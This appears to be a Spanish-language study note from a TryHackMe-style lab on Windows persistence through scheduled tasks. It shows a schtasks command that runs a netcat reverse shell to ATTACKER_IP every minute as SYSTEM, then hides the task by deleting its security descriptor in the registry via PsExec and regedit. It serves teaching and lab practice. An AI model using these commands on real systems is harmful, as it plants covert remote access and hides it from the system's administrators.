---
layout: apunte
title: "5. Abusing Scheduled Tasks"
---

También podemos usar tareas programadas para establecer persistencia. Hay varias maneras de programar la ejecución de un payload en sistemas Windows, vamos a ver algunas:

--------------------------------------------
<h2>Programador de Tareas</h2>
La forma más común de programar tareas es usar el programador de tareas integrado de Windows. El programador de tareas nos permite control granular de cuándo empieza una tarea permitiéndonos configurar las tareas que se activarán a horas específicas, repitan periódicamente o disparen cuando un evento específico ocurra. Desde la linea de comandos, puedes usar `schtasks` para interactuar con el programador de tareas. Una referencia completa para el comando puede encontrarse en la [página de Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Vamos a crear una tarea que ejecute una reverse shell cada minuto. En un escenario real, no querrías que tu payload se ejecutara tan a menudo pero aquí no tenemos por qué esperar:

```batch
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

El comando previo creará la tarea "THM-Backdoor" y ejecutará una reverse shell con `nc64`. Las opciones `/sc` y `/mo` indican que la tarea debería ejecutarse cada minuto. La opción `/ru` indica que la tarea se ejecutará con privilegios SYSTEM.

Para comprobar si se creó exitosamente, podemos usar el comando:

```batch
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

------------------------------------------------
<h2>Hacer Nuestra Tarea Invisible</h2>
Nuestra tarea debería estar corriendo por ahora, pero si el usuario comprometido intenta listar las tareas programadas, nuestra backdoor será visible. Para esconder la tarea programada, podemos hacerla invisible a cualquier usuario en el sistema borrando su descriptor de seguridad (SD). Este SD es un ACL que establece qué usuarios tienen acceso a las tareas programadas. Si tu usuario no tiene permitido consultar una tarea programada, no podrás verla, ya que Windows sólo muestra las tareas que tienes permiso para usar. Borrar el SD es el equivalente a des-permitir a todos los usuarios el acceso a dicha tarea, incluido administradores.

Los descriptores de seguridad de las tareas programadas están almacenados en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. Encontrarás la clave de registro para cada tarea, bajo la cual una clave nombrada "SD" contiene el descriptor de seguridad. Sólo puedes borrar el valor si tienes privilegios SYSTEM.

Para esconder nuestra tarea vamos a borrar el valor SD para la tarea "THM-Backdoor" que creamos antes. Para hacerlo, usaremos `psexec` (disponible en `C:\tools`) para abrir Regedit con privilegios SYSTEM:

```batch
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

Después borraremos el descriptor de seguridad de nuestra tarea:

!**Pasted image 20260704162956.png**

Si tratamos de consultar el servicio de nuevo, el sistema no nos mostrará dicha tarea:

```batch
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```
